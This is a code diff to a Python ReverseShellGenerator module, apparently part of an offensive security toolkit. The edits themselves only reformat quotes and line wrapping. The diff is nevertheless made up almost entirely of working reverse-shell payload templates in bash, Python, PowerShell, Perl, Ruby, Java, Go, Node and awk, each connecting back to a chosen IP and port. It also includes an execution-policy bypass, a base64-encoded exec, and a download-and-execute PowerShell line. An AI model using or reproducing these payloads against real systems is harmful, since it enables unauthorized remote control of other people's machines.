@@ -40,7 +40,7 @@ class ReverseShellGenerator(BaseModule):
                     "exec:bash,pty,stderr,setsid,sigint,sane"
                 ),
                 "with_python": (
-                    "python3 -c \"import socket,subprocess,os;"
+                    'python3 -c "import socket,subprocess,os;'
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                     "s.connect(('{ip}',{port}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
@@ -52,7 +52,7 @@ class ReverseShellGenerator(BaseModule):
             },
             "python": {
                 "basic": (
-                    "python3 -c \"import socket,subprocess,os;"
+                    'python3 -c "import socket,subprocess,os;'
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                     "s.connect(('{ip}',{port}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
@@ -60,7 +60,7 @@ class ReverseShellGenerator(BaseModule):
                     "subprocess.call(['/bin/bash','-i']);\""
                 ),
                 "python2": (
-                    "python -c \"import socket,subprocess,os;"
+                    'python -c "import socket,subprocess,os;'
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                     "s.connect(('{ip}',{port}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
@@ -68,18 +68,18 @@ class ReverseShellGenerator(BaseModule):
                     "subprocess.call(['/bin/bash','-i']);\""
                 ),
                 "with_pty": (
-                    "python3 -c \"import socket,subprocess,os,pty;"
+                    'python3 -c "import socket,subprocess,os,pty;'
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                     "s.connect(('{ip}',{port}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                     "os.dup2(s.fileno(),2);pty.spawn('/bin/bash');\""
                 ),
                 "encoded": (
-                    "python3 -c \"import base64;"
+                    'python3 -c "import base64;'
                     "exec(base64.b64decode('{b64_payload}'))\""
                 ),
                 "oneliner": (
-                    "python3 -c \"import socket,subprocess,os;"
+                    'python3 -c "import socket,subprocess,os;'
                     "s=socket.socket();s.connect(('{ip}',{port}));"
                     "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
                     "subprocess.call(['/bin/bash']);\""
@@ -87,7 +87,7 @@ class ReverseShellGenerator(BaseModule):
             },
             "powershell": {
                 "basic": (
-                    "powershell -c \"$client = New-Object "
+                    'powershell -c "$client = New-Object '
                     "System.Net.Sockets.TCPClient('{ip}',{port});"
                     "$stream = $client.GetStream();"
                     "[byte[]]$bytes = 0..65535|%{{0}};"
@@ -98,11 +98,11 @@ class ReverseShellGenerator(BaseModule):
                     "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                     "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                     "$stream.Write($sendbyte,0,$sendbyte.Length);"
-                    "$stream.Flush()}};$client.Close()\""
+                    '$stream.Flush()}};$client.Close()"'
                 ),
                 "encoded": "powershell -enc {b64_payload}",
                 "bypass": (
-                    "powershell -ExecutionPolicy Bypass -c \"$client = New-Object "
+                    'powershell -ExecutionPolicy Bypass -c "$client = New-Object '
                     "System.Net.Sockets.TCPClient('{ip}',{port});"
                     "$stream = $client.GetStream();"
                     "[byte[]]$bytes = 0..65535|%{{0}};"
@@ -113,12 +113,12 @@ class ReverseShellGenerator(BaseModule):
                     "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                     "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                     "$stream.Write($sendbyte,0,$sendbyte.Length);"
-                    "$stream.Flush()}};$client.Close()\""
+                    '$stream.Flush()}};$client.Close()"'
                 ),
                 "nishang": (
-                    "powershell -c \"IEX (New-Object Net.WebClient)"
+                    'powershell -c "IEX (New-Object Net.WebClient)'
                     ".DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1');"
-                    "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}\""
+                    'Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"'
                 ),
             },
             "php": {
@@ -147,31 +147,31 @@ class ReverseShellGenerator(BaseModule):
                 "basic": (
                     'perl -e \'use Socket;$i="{ip}";$p={port};'
                     'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
-                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
+                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                     'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                     'exec("/bin/bash -i");}};\''
                 ),
                 "with_sh": (
                     'perl -e \'use Socket;$i="{ip}";$p={port};'
                     'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
-                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
+                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                     'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                     'exec("/bin/sh -i");}};\''
                 ),
                 "oneliner": (
                     "perl -MIO -e '$p=fork;exit,if($p);"
-                    "$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");"
+                    '$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");'
                     "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
                 ),
             },
             "ruby": {
                 "basic": (
-                    'ruby -rsocket -e\'exit if fork;'
+                    "ruby -rsocket -e'exit if fork;"
                     'c=TCPSocket.new("{ip}","{port}");'
                     'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
                 ),
                 "with_bash": (
-                    'ruby -rsocket -e\'exit if fork;'
+                    "ruby -rsocket -e'exit if fork;"
                     'c=TCPSocket.new("{ip}","{port}");'
                     'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
                 ),
@@ -188,18 +188,18 @@ class ReverseShellGenerator(BaseModule):
                 ),
                 "with_socket": (
                     'String host="{ip}"; int port={port}; String cmd="/bin/bash"; '
-                    'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
-                    'Socket s=new Socket(host,port);'
-                    'InputStream pi=p.getInputStream(),pe=p.getErrorStream(),'
-                    'si=s.getInputStream();'
-                    'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
-                    'while(!s.isClosed()){{'
-                    'while(pi.available()>0)so.write(pi.read());'
-                    'while(si.available()>0)po.write(si.read());'
-                    'while(pe.available()>0)so.write(pe.read());'
-                    'so.flush();po.flush();Thread.sleep(50);'
-                    'try {{p.exitValue();break;}}catch (Exception e){{}};}};'
-                    'p.destroy();s.close();'
+                    "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
+                    "Socket s=new Socket(host,port);"
+                    "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),"
+                    "si=s.getInputStream();"
+                    "OutputStream po=p.getOutputStream(),so=s.getOutputStream();"
+                    "while(!s.isClosed()){{"
+                    "while(pi.available()>0)so.write(pi.read());"
+                    "while(si.available()>0)po.write(si.read());"
+                    "while(pe.available()>0)so.write(pe.read());"
+                    "so.flush();po.flush();Thread.sleep(50);"
+                    "try {{p.exitValue();break;}}catch (Exception e){{}};}};"
+                    "p.destroy();s.close();"
                 ),
             },
             "golang": {
@@ -207,13 +207,13 @@ class ReverseShellGenerator(BaseModule):
                     'package main;import"os/exec";import"net";func main(){{'
                     'c,_:=net.Dial("tcp","{ip}:{port}");'
                     'cmd:=exec.Command("/bin/bash");'
-                    'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
+                    "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}"
                 ),
                 "with_sh": (
                     'package main;import"os/exec";import"net";func main(){{'
                     'c,_:=net.Dial("tcp","{ip}:{port}");'
                     'cmd:=exec.Command("/bin/sh");'
-                    'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
+                    "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}"
                 ),
             },
             "lua": {
@@ -246,7 +246,7 @@ class ReverseShellGenerator(BaseModule):
                     "client.end('Disconnected\\n'); }}); }}); "
                     "client.on('error', function(e) {{ "
                     "setTimeout(function() {{c(HOST,PORT);}}, TIMEOUT); }}); }} "
-                    "c(HOST,PORT);\""
+                    'c(HOST,PORT);"'
                 ),
             },
             "telnet": {
@@ -257,7 +257,7 @@ class ReverseShellGenerator(BaseModule):
                 "basic": (
                     'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; '
                     'while(42) {{ do{{ printf "shell>" |& s; s |& getline c; '
-                    'if(c){{ while ((c |& getline) > 0) print $0 |& s; '
+                    "if(c){{ while ((c |& getline) > 0) print $0 |& s; "
                     'close(c); }} }} while(c != "exit") close(s); }}}\' /dev/null'
                 )
             },
@@ -449,7 +449,9 @@ class ReverseShellGenerator(BaseModule):
             return
 
         # Generate payloads for selected languages
-        print(f"\n\033[93mGenerating payloads for: {', '.join(selected_languages)}\033[0m")
+        print(
+            f"\n\033[93mGenerating payloads for: {', '.join(selected_languages)}\033[0m"
+        )
         print(f"\033[93mTarget: {ip}:{port}\033[0m")
         print(f"\033[93m{'-'*60}\033[0m")
 
